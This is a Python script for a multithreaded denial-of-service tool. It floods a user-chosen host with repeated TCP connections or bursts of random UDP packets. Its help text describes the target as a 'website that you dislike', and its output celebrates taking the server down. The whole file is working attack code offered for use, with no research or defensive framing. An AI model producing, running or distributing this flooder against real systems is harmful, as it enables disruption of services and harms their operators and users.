import socket
import threading
import time
import sys
import argparse
import random

connections = 0

def flood(host: str, port: int, protocol: str):
    global connections
    # https://stackoverflow.com/questions/5815675/what-is-sock-dgram-and-sock-stream
    if protocol == 'TCP':
        socket_type = socket.SOCK_STREAM
    elif protocol == 'UDP':
        socket_type = socket.SOCK_DGRAM
    else:
        raise RuntimeError('Unexpected protocol {}'.format(protocol))
    try:
        sock = socket.socket(socket.AF_INET, socket_type)
        if protocol == 'TCP':
            sock.settimeout(3)
            sock.connect((host, port))
            time.sleep(3)
            sock.close()
        elif protocol == 'UDP':
            # https://github.com/Leeon123/TCP-UDP-Flood/blob/master/flood.py
            data = random._urandom(1024)
            for i in range(100):
                sock.sendto(data, (host, port))
        connections += 1
    except (socket.error, socket.timeout):
        pass


class DoYourThing(threading.Thread):
    def __init__(self, hostname: str, port: int, protocol: str):
        self.hostname = hostname
        self.port = port
        self.protocol = protocol
        super().__init__(daemon=True)

    def run(self):
        while True:
            flood(self.hostname, self.port, self.protocol)


def parse_args():
    ap = argparse.ArgumentParser()
    ap.add_argument('threads', type=int, help='Number of threads you want to ping')
    ap.add_argument('url', type=str, help='website that you dislike')
    ap.add_argument('--port', default=443, type=int, help='Port to connect to')
    ap.add_argument('--protocol', default='TCP', type=str, choices=['TCP', 'UDP'], help='which protocol to use')
    args = ap.parse_args()
    return args


def run():
    global connections
    args = parse_args()
    print('SYN flooding %s on %d threads' % (args.url, args.threads))
    now = (time.time())
    for _ in range(args.threads):
        DoYourThing(args.url, args.port, args.protocol).start()
    wasted_bytes = 0
    while True:
        try:
            if int(time.time()) != now:
                now = int(time.time())
                if connections == 0:
                    print('The target server is down. Let us keep it that way.')
                else:
                    print('Last seconds made', connections, 'calls which involved', connections*24, 'wasted bytes on the behalf of',
                          args.url)
                    wasted_bytes += connections * 24
                    connections = 0
        except KeyboardInterrupt:
            print('Good job, you wasted', wasted_bytes, 'bytes of traffic! Good bye and have a nice day!')
            break
